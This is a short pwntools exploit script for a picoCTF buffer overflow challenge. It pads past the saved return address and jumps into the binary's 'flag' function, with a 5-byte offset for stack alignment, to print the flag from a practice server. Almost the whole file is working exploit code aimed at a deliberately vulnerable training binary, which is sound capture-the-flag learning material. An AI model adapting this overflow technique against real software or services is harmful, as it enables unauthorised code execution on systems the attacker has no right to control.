'''
tags: `bof`, `stack alignment`

bof and return to function that read and print flag
'''
from pwn import *

host = 'saturn.picoctf.net'
port = 60285

elf = ELF('./vuln')

context.binary = elf
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b main
b vuln
b *0x00000000004012d1
'''

# symbols
vuln_func = elf.symbols['flag']

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        if args.LD_PRELOAD:
            import os
            r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        else:
            r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'flag: \n')
    padding = cyclic_find(0x61616173)
    payload = b'a' * padding
    payload += p64(vuln_func + 5)
    r.sendline(payload)
    print (r.recvuntil(b'}').decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()